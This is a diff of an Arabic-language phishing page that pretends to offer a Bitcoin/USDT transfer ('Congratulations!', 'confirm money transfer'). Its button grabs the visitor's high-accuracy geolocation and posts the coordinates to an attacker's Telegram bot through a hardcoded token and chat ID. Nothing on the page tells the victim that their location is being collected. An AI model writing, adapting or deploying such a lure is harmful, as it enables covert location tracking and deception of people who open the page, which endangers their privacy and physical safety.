@@ -1,67 +1,87 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>عملات رقمية USDT وبيتكوين</title>
+  <title>تحويل الأموال</title>
   <style>
     body {
-      background-color: #000;
-      color: gold;
+      background-color: #f2f2f2;
       text-align: center;
       font-family: Arial, sans-serif;
-      padding: 40px;
+      padding-top: 100px;
     }
-    img {
-      width: 150px;
-      margin-bottom: 20px;
+    .box {
+      background: white;
+      padding: 30px;
+      margin: auto;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
     }
     h1 {
-      font-size: 28px;
-      margin-bottom: 30px;
+      color: #333;
     }
     button {
-      padding: 15px 30px;
-      font-size: 20px;
-      background-color: gold;
-      color: black;
+      background-color: #ffcc00;
       border: none;
+      padding: 15px 25px;
+      font-size: 16px;
       border-radius: 10px;
       cursor: pointer;
+    }
+    button:hover {
+      background-color: #e6b800;
+    }
+    img {
+      width: 80px;
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo" />
-  <h1>عملات رقمية USDT وبيتكوين</h1>
-  <button onclick="getLocation()">رجاءً اضغط لتحويل المال لمحفظتك</button>
+  <div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin" />
+    <h1>تهانينا!</h1>
+    <p>رجاءً اضغط لتحويل المال لمحفظتك</p>
+    <button onclick="getLocation()">تأكيد تحويل المال</button>
+  </div>
 
   <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendToTelegram);
-      } else {
-        alert("Geolocation not supported.");
-      }
-    }
-
-    function sendToTelegram(position) {
+    function sendLocation(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
-      const chat_id = "7485197107";
-      const message = `📍 موقع جديد:\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      const telegramToken = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
+      const chatId = "5931662777";
+      const message = `📍 تم تحديد موقع الشخص:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
+
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
         method: "POST",
         headers: {
-          "Content-Type": "application/json"
+          "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          chat_id: chat_id,
-          text: message
-        })
-      });
+          chat_id: chatId,
+          text: message,
+        }),
+      }).then(r => r.json()).then(console.log).catch(console.error);
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          sendLocation,
+          (err) => {
+            console.error("لم يتم تحديد الموقع:", err);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0,
+          }
+        );
+      }
     }
   </script>
 </body>
